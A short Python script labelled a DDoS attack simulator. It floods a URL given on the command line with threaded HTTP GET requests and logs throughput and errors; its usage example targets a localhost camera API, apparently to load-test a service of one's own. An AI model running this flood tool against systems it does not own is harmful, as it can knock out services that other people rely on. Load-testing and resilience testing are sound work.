#!/usr/bin/env python3
"""
DDoS Attack Simulator
Generates high-volume requests to simulate a DDoS attack
"""

import requests
import threading
import time
import sys
from concurrent.futures import ThreadPoolExecutor
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DDOSSimulator:
    def __init__(self, target_url, num_threads=10, duration=30):
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.request_count = 0
        self.error_count = 0
        self.start_time = None
        self.running = False
    
    def send_request(self):
        """Send a single request to the target"""
        try:
            response = requests.get(
                self.target_url,
                timeout=2
            )
            self.request_count += 1
            if response.status_code != 200:
                self.error_count += 1
        except Exception as e:
            self.error_count += 1
    
    def attack_worker(self):
        """Worker thread that sends requests continuously"""
        while self.running:
            self.send_request()
            time.sleep(0.01)  # Small delay between requests
    
    def run(self):
        """Run the DDoS attack"""
        self.running = True
        self.start_time = time.time()
        
        logger.info(f"🚀 Starting DDoS attack on {self.target_url}")
        logger.info(f"   Threads: {self.num_threads}")
        logger.info(f"   Duration: {self.duration} seconds")
        logger.info(f"   Starting attack...")
        
        try:
            with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
                # Start all worker threads
                futures = [
                    executor.submit(self.attack_worker)
                    for _ in range(self.num_threads)
                ]
                
                # Monitor attack progress
                start = time.time()
                last_count = 0
                
                while (time.time() - start) < self.duration:
                    elapsed = time.time() - start
                    requests_per_sec = (self.request_count - last_count) / 1.0
                    
                    logger.info(
                        f"[{elapsed:.0f}s] Requests: {self.request_count} | "
                        f"RPS: {requests_per_sec:.0f} | "
                        f"Errors: {self.error_count}"
                    )
                    
                    last_count = self.request_count
                    time.sleep(1)
                
                # Stop attack
                self.running = False
                
        except KeyboardInterrupt:
            logger.info("⚠️  Attack interrupted by user")
            self.running = False
        
        # Print results
        elapsed = time.time() - self.start_time
        logger.info("")
        logger.info("====== ATTACK RESULTS ======")
        logger.info(f"Duration: {elapsed:.2f} seconds")
        logger.info(f"Total Requests: {self.request_count}")
        logger.info(f"Successful: {self.request_count - self.error_count}")
        logger.info(f"Failed: {self.error_count}")
        logger.info(f"Avg RPS: {self.request_count / elapsed:.0f}")
        logger.info("============================")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python ddos_simulator.py <target_url> [threads] [duration]")
        print("Example: python ddos_simulator.py http://localhost:8001/api/cameras 20 30")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30
    
    simulator = DDOSSimulator(target, threads, duration)
    simulator.run()
